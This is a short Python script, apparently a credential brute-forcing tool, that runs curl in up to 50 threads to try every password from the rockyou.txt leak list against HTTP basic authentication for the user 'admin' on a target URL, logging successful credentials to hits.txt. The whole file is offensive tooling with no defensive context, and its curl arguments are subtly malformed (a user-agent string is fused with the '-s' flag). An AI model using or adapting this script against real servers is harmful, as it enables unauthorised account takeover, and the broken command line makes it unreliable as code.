import os
import threading
import subprocess


target_url = input("Target: ")
threads = 50  # Max concurrent threads

with open('rockyou.txt', 'r', encoding='latin-1') as f:
    passwords = [line.strip() for line in f]

usernames = ["admin"]  # FIXED

def run_combo(user, pwd):
    result = subprocess.run(
        ['curl', '-u', f'{user}:{pwd}', '-L', 'Mozilla/5.0' '-s', '-o', '/dev/null', '-w', '%{http_code}', target_url],
        capture_output=True,
        text=True
    )
    code = result.stdout.strip()
    print(f"[{code}] {user}:{pwd}")
    if code == "200":
        with open("hits.txt", "a") as hitfile:
            hitfile.write(f"{user}:{pwd}\n")

def brute():
    for user in usernames:
        for pwd in passwords:
            while threading.active_count() > threads:
                pass
            t = threading.Thread(target=run_combo, args=(user, pwd))
            t.start()

brute()
